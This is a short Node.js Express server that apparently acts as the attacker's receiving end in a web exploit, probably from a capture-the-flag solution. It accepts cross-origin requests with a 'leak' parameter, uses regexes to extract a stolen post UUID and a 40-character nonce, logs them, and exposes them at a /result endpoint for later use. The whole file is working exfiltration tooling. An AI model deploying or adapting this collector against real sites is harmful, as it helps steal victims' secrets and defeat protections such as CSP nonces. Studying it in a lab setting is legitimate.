const express = require('express');
const app = express();
const https = require('https')
const path = require('path');
const fs = require('fs')
const ch = require("child_process");

const cors = require('cors');

app.use(cors({origin: '*'}));
app.use(express.static('static'));

let postId;
let nonce;

app.all('/', (req, res) => {
  const leak = req.query['leak'];
  if (!leak) return res.send("ok!");

  const postIdMatch = leak.match(/[0-9a-f]{8}-(?:[0-9a-f]{4}-){3}[0-9a-f]{12}/i)
  if (postIdMatch !== null) { // If we've found a postId
    postId = postIdMatch[0]
  }
  const nonceMatch = leak.match(/[0-9a-z]{40}/i)
  if (nonceMatch !== null) { // If we've found a nonce
    nonce = nonceMatch[0]
  }

  console.log(`Leak completed. PostId: '${postId}'. Nonce: '${nonce}'`)
  return res.send("ok!");
})

app.get('/result', (req, res) => {
  return res.send({ postId: postId, nonce: nonce })
})


app.listen(3000,'localhost');
